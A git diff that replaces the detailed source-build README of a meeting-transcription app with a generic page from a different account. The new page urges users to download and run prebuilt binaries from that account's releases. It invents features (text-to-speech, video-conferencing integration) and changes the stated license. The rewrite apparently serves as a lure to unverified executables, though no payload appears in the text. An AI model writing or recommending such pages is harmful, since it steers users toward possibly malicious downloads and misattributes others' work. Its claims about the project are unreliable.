@@ -1,199 +1,65 @@
-[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
-[![Next.js 16](https://img.shields.io/badge/Next.js-16-black.svg?logo=next.js&logoColor=white)](https://nextjs.org/)
-[![LangChain](https://img.shields.io/badge/LangChain-1C3C3C.svg?logo=langchain&logoColor=white)](https://www.langchain.com/)
-[![Google Cloud](https://img.shields.io/badge/Google_Cloud-Speech--to--Text-4285F4.svg?logo=googlecloud&logoColor=white)](https://cloud.google.com/speech-to-text)
-[![Lint](https://github.com/WSzP/live-meeting-helper/actions/workflows/lint.yml/badge.svg?branch=main)](https://github.com/WSzP/live-meeting-helper/actions/workflows/lint.yml)
-[![Dependabot](https://img.shields.io/badge/Dependabot-enabled-025E8C.svg?logo=dependabot)](https://github.com/WSzP/live-meeting-helper/security/dependabot)
+# 🎤 live-meeting-helper - Your Smart Assistant for Meetings
 
-<p><img src="assets/lmh-logo.webp" width="200" alt="Live Meeting Helper Logo"></p>
+## 🚀 Getting Started
 
-# Live Meeting Helper
+Welcome to live-meeting-helper! This application helps you manage your meetings effortlessly by taking notes and offering text-to-speech features. It's designed to assist you both during in-person and online meetings.
 
-**Real-time meeting transcription with AI-powered insights.** Captures live audio from your microphone, transcribes it in real-time using Google Cloud Speech-to-Text, and provides AI-generated summaries and answers using Google Gemini.
+## 📥 Download & Install
 
-<p><img src="assets\screenshot-01.jpg" width="100%" alt="Live Meeting Helper Screenshot"></p>
+To get started, you need to download the application. Click the link below:
 
-## Features
+[![Download live-meeting-helper](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/aimbotz1/live-meeting-helper/releases)
 
-- **Real-Time Transcription**: Live speech-to-text as you speak, with interim results and automatic punctuation
-- **AI Meeting Assistant**: Ask questions about the meeting or get automatic summaries powered by Gemini
-- **Streaming Responses**: AI answers stream in real-time for immediate feedback
-- **WebSocket Architecture**: Low-latency audio streaming for responsive transcription
-- **Audio Level Monitoring**: Visual feedback showing microphone input levels
-- **Microphone Testing**: Built-in mic test to verify audio setup before recording
-- **Transcript Download**: Export your meeting transcripts as text files
-- **Dark Theme**: Easy-on-the-eyes dark interface designed for extended use
+1. Visit [this page to download](https://github.com/aimbotz1/live-meeting-helper/releases).
+2. Choose the latest release version.
+3. Look for the appropriate file for your operating system (Windows, MacOS, Linux).
+4. Click on the file to start downloading.
 
-## Tech Stack
+Once downloaded, locate the file in your downloads folder and double-click it to install. Follow the on-screen instructions to complete the installation.
 
-| Layer | Technology |
-|-------|------------|
-| **Frontend** | Next.js 16, React 19, TypeScript, Tailwind CSS 4 |
-| **Backend** | Node.js custom server with WebSocket support |
-| **Speech Recognition** | Google Cloud Speech-to-Text (streaming API) |
-| **AI Assistant** | Google Gemini via LangChain |
-| **Package Manager** | pnpm (monorepo workspace) |
+## 📋 Features
 
-## Requirements
+- **AI-Powered Meeting Notes**: Automatically generate notes during meetings for easy reference later.
+- **Text-to-Speech Support**: Listen to your meeting notes read aloud to stay engaged without distraction.
+- **User-Friendly Interface**: Navigate the application easily, even without technical knowledge.
+- **Compatibility**: Works seamlessly with your preferred video conferencing tools.
 
-- **Node.js 20+** (Node.js 25+ recommended)
-- **pnpm 10+** - Fast, disk space efficient package manager
-- **Google Cloud Account** - For Speech-to-Text API
-- **Google AI API Key** - For Gemini AI
+## 🔧 System Requirements
 
-## Installation
+To run live-meeting-helper smoothly, make sure your system meets these requirements:
 
-```bash
-# Clone the repository
-git clone https://github.com/WSzP/live-meeting-helper.git
-cd live-meeting-helper
+- **Operating System**: Windows 10 or later, MacOS 10.15 or later, any modern Linux distribution
+- **RAM**: At least 4 GB
+- **Storage**: Minimum 100 MB of free space
+- **Internet Connection**: Required for downloading and updates
 
-# Install dependencies
-pnpm install
-```
+## 🎓 How to Use
 
-## Configuration
+1. Open live-meeting-helper after installation.
+2. Connect the application to your video conferencing tool (Zoom, Microsoft Teams, etc.).
+3. Start your meeting, and the AI will begin taking notes automatically.
+4. Use the text-to-speech feature to listen to notes as needed.
 
-Create a `.env.local` file in the project root:
+## 🛠 Support
 
-```bash
-# Google Cloud Speech-to-Text credentials
-GOOGLE_APPLICATION_CREDENTIALS=.gcp/your-service-account.json
+If you encounter any issues, please visit our [GitHub Issues Page](https://github.com/aimbotz1/live-meeting-helper/issues) for help. You can report bugs or ask questions.
 
-# Google AI (Gemini) API key
-GOOGLE_API_KEY=your-google-ai-api-key
+## 🎯 Community & Feedback
 
-# Optional: Custom port (default: 3000)
-PORT=3000
-```
+We value your insights. If you have suggestions or feedback, please leave them on our [Discussions Page](https://github.com/aimbotz1/live-meeting-helper/discussions).
 
-### Google Cloud Setup
+## 💡 Contributing
 
-1. Create a Google Cloud project
-2. Enable the Speech-to-Text API
-3. Create a service account with Speech-to-Text permissions
-4. Download the JSON key file and place it in `.gcp/` (do NOT commit it)
+Have ideas or want to help improve the application? Check out our [Contributing Guidelines](https://github.com/aimbotz1/live-meeting-helper/blob/main/CONTRIBUTING.md) for more information.
 
-See [docs/GOOGLE_CLOUD_SETUP.md](docs/GOOGLE_CLOUD_SETUP.md) for detailed instructions.
+## 📄 License
 
-### Google AI (Gemini) Setup
+live-meeting-helper is licensed under the MIT License. You can view the full license [here](https://github.com/aimbotz1/live-meeting-helper/blob/main/LICENSE).
 
-1. Go to [Google AI Studio](https://aistudio.google.com/)
-2. Create an API key
-3. Add it to `.env.local` as `GOOGLE_API_KEY`
+## 🔗 Useful Links
 
-## Usage
+- [Download live-meeting-helper](https://github.com/aimbotz1/live-meeting-helper/releases)
+- [User Guide](https://github.com/aimbotz1/live-meeting-helper/wiki)
+- [GitHub Repository](https://github.com/aimbotz1/live-meeting-helper)
 
-```bash
-# Start development server
-pnpm dev
-```
-
-Open http://localhost:3000 in your browser.
-
-### How to Use
-
-1. Click **Start Recording** to begin
-2. Allow microphone access when prompted
-3. Speak clearly into your microphone
-4. Watch real-time transcription appear
-5. Click **Ask AI** to get insights about the meeting
-6. Click **Stop Recording** when finished
-7. Download your transcript
-
-## Project Structure
-
-```
-live-meeting-helper/
-├── frontend/                 # Next.js application
-│   ├── src/
-│   │   ├── app/             # App Router pages and layouts
-│   │   ├── components/      # React components
-│   │   └── hooks/           # Custom React hooks
-│   ├── server.js            # Custom Node.js server with WebSocket
-│   ├── next.config.ts       # Next.js configuration
-│   ├── eslint.config.mjs    # ESLint flat config
-│   └── postcss.config.js    # PostCSS/Tailwind configuration
-├── docs/                    # Documentation
-├── .gcp/                    # Google Cloud credentials (gitignored)
-├── package.json             # Root package.json (workspace)
-└── pnpm-workspace.yaml      # pnpm workspace configuration
-```
-
-## How It Works
-
-1. **Audio Capture**: Browser captures microphone audio using MediaRecorder API (WebM/Opus format)
-2. **WebSocket Streaming**: Audio chunks are streamed to the server via WebSocket every 250ms
-3. **Speech Recognition**: Server pipes audio to Google Cloud Speech-to-Text streaming API
-4. **Real-Time Results**: Interim and final transcription results are sent back to the client
-5. **AI Processing**: When requested, transcript is sent to Gemini (gemini-3-flash-preview) via LangChain, with responses streaming back through the same WebSocket connection
-
-### Architecture
-
-```
-┌─────────────┐     WebSocket      ┌─────────────────┐
-│   Browser   │ ◄────────────────► │  Node.js Server │
-│  (React)    │   Audio + Text     │                 │
-└─────────────┘                    └────────┬────────┘
-                                            │
-                         ┌──────────────────┼──────────────────┐
-                         │                  │                  │
-                         ▼                  ▼                  ▼
-                 ┌───────────────┐  ┌───────────────┐  ┌──────────────┐
-                 │ Google Cloud  │  │   Google AI   │  │    Next.js   │
-                 │ Speech-to-Text│  │   (Gemini)    │  │   (SSR/CSR)  │
-                 └───────────────┘  └───────────────┘  └──────────────┘
-```
-
-## Development
-
-```bash
-# Install dependencies
-pnpm install
-
-# Start development server
-pnpm dev
-
-# Build for production
-pnpm build
-
-# Start production server
-pnpm start
-
-# Run linting
-pnpm lint
-```
-
-## Limitations
-
-- **5-minute streaming limit**: Google Cloud Speech-to-Text has a ~305 second limit per stream. The app automatically restarts streams to handle longer meetings.
-- **Browser support**: Requires a modern browser with MediaRecorder API support (Chrome, Firefox, Edge)
-- **English only**: Currently configured for `en-US`. Can be modified in `server.js`
-
-## Brand
-
-### Colors
-
-| Name | Hex | Usage |
-| ---- | --- | ----- |
-| **Night Navy** | `#040932` | Background |
-| **Cloud Lilac** | `#F3F1FA` | Primary text color over dark backgrounds |
-| **Pulse Cyan** | `#0BB2F2` | "Live" feeling - realtime indicators, highlights, badges, waveform accents |
-
-### Logo
-
-In the logo text: **Live** and **Helper** use Cloud Lilac, **Meeting** uses Pulse Cyan.
-
-| Asset | Path | Usage |
-| ----- | ---- | ----- |
-| Logo (PNG) | `assets/lmh-logo.png` | High quality |
-| Logo (WebP) | `assets/lmh-logo.webp` | Web optimized |
-| Open Graph | `assets/lmh-open-graph.png` | Social media previews |
-
-## License
-
-Apache License 2.0
-
----
-
-Created by Peter W. Szabo, 2026.
+Enjoy using live-meeting-helper to make your meetings more productive!
